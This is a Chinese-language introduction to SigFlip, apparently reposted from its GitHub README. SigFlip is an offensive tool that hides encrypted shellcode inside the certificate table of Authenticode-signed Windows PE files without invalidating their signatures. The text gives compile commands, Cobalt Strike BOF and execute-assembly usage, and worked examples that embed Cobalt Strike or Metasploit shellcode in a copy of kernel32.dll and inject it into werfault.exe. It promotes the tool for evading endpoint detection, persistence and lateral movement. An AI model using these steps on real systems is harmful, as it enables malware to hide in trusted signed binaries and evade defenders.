## 关于SigFlip

 **SigFlip是一款能够篡改经过身份认证码签名的PE文件（exe、dll、sys等）的工具**
，而且整个过程不会影响或破坏已有的身份认证码签名。换句话来说，就是我们可以使用SigFlip向PE文件中嵌入数据（比如Shellcode），并且再不会破坏文件签名、完整性检查或PE文件功能的情况下，修改PE文件的校验和或哈希。

SigInject组件可以将Shellcode注入至PE文件的[WIN_CERTIFICATE]证书表中，并输出加密密钥以便配合BOF/C/C#加载器（SigLoader）一起使用。SigInject将保存针对PE文件的修改操作，并保证其签名和证书有效性不变。

SigLoader是一个基础加载器，它采用SigInject创建的修改后的PE文件路径和解密密钥作为参数，然后提取和解密嵌入的Shellcode，以供选择Shellcode注入使用。

SigFlip将检查PE哈希是否已成功更改，然后退出以绕过终端针对此类行为的检查。

SigFlip可以用于持久化感染、横向渗透以及命令/代码执行等场景。

注意事项：igFlip、SigInject和SigLoader将以BOF脚本和.NET程序集提供。

## 工具安装

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/med0x2e/SigFlip.git

## 工具构建/编译

本项目并没有提供预编译的BOF，我们可以使用Mingw-w64来进行编译。如果是.NET，可以使用VS或csc.exe来编译.NET项目（SigFlip、SigLoader）；如果是BOF，请按照下列步骤操作：

    
    
    ➜ i686-w64-mingw32-gcc -c sigflip.c -o sigflip.x86.o
    
    ➜ x86_64-w64-mingw32-gcc -c sigflip.c -o sigflip.x64.o
    
    ➜ x86_64-w64-mingw32-gcc -c SigLoader/sigloader.c -o sigloader.x64.o
    
    ➜ i686-w64-mingw32-gcc -c SigLoader/sigloader.c -o sigloader.x86.o

确保所有的对象文件都存储在sigflip.cna的相同目录下，然后在Cobalt Strike中加载sigflip.cna。

注意事项：预编译的BOF使用的是mingw-64 v8.0.0_3，如果你所使用的mingw-64 >= v9，可能会出现崩溃的情况。

## Cobalt Strike

### 执行程序集

    
    
    execute-assembly SigFlip.exe -h
    
    execute-assembly SigLoader -h

### BOF

当我们在Cobalt Strike中加载sigflip.cna了之后，将会注册两个新命令，我们此时就能够以下列方式使用SigFlip和SigInject了。

 **SigFlip：** 在不破坏签名或证书有效性的情况下，修改PE文件哈希：

    
    
    SigFlip "<PE\_FILE\_PATH>" "<OUTPUT\_PE\_FILE\_PATH (with extension)>"

 **SigInject：**
向PE文件的[WIN_CERTIFICATE]证书表中注入加密的Shellcode，打印的加密密钥可以跟基础C/C#加载器结合使用以保证签名和证书的完整性：

    
    
    SigInject "<PE\_FILE\_PATH> <OUTPUT\_PE\_FILE\_PATH (with extension)>" "<SHELLCODE\_FILE>"

 **SigLoader：** 从PE文件中加载由SigInject加密的Shellcode，然后使用Early
Bird向指定进程注入Shellcode，我们可以自定义Shellcode的注入逻辑，或直接替换目标代码：

    
    
    SigLoader <PE_FILE_PATH_WITH_SH> <DECRYPTION_KEY> <SPAWNTO_PROCESS_PATH> <PARENT_PROCESS_ID>

## 工具使用样例

### BOF

向msbuild.exe注入随机数据：

    
    
    SigFlip "C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe" "C:\lolbins\modified-msbuild.exe"

向kernel32.ell注入Shellcode：

    
    
    SigInject "C:\Windows\System32\kernel32.dll" "C:\random\modified-kernel32.dll" "C:\shellcode\cobaltstrike_or_msf_shellcode.bin"
    
    Sigloader "C:\random\modified-kernel32.dll" "DECRYPTION_KEY" "C:\Windows\System32\werfault.exe" 6300

### 执行程序集

向msbuild.exe注入随机数据：

    
    
    execute-assembly SigFlip.exe -b C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -o C:\Temp\MSBuild.exe

向kernel32.ell注入Shellcode：

    
    
    execute-assembly SigFlip.exe -i C:\Windows\System32\kernel32.dll -s C:\Temp\x86shellcode.bin -o C:\Temp\kernel32.dll -e TestSecretKey
    
    execute-assembly SigLoader.exe -f C:\Temp\modified-kernel32.dll -e TestSecretKey -pid 2354

## 项目地址

 **SigFlip：** 【[ _GitHub传送门_](https://github.com/med0x2e/SigFlip)】

## 参考资料

> [ _https://docs.microsoft.com/en-us/security-> updates/SecurityBulletins/2013/ms13-098?redirectedfrom=MSDN_](https://docs.microsoft.com/en-> us/security-updates/SecurityBulletins/2013/ms13-098?redirectedfrom=MSDN)
>
> [ _https://docs.microsoft.com/en-us/security-> updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN_](https://docs.microsoft.com/en-> us/security-updates/SecurityAdvisories/2014/2915720?redirectedfrom=MSDN)
>
> [
> _http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/authenticode_pe.docx_](http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/authenticode_pe.docx)
>
> [ _https://msrc-blog.microsoft.com/2013/12/10/ms13-098-update-to-enhance-> the-security-of-authenticode/_](https://msrc-> blog.microsoft.com/2013/12/10/ms13-098-update-to-enhance-the-security-of-> authenticode/)
>
> [
> _https://www.specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf_](https://www.specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)
>
> [ _https://p0w3rsh3ll.wordpress.com/2014/05/24/testing-ms13-098-certificate-> padding-check/_](https://p0w3rsh3ll.wordpress.com/2014/05/24/testing-> ms13-098-certificate-padding-check/)
>
> [ _http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-> yanagishita_en.pdf﻿_](http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-> yanagishita_en.pdf)

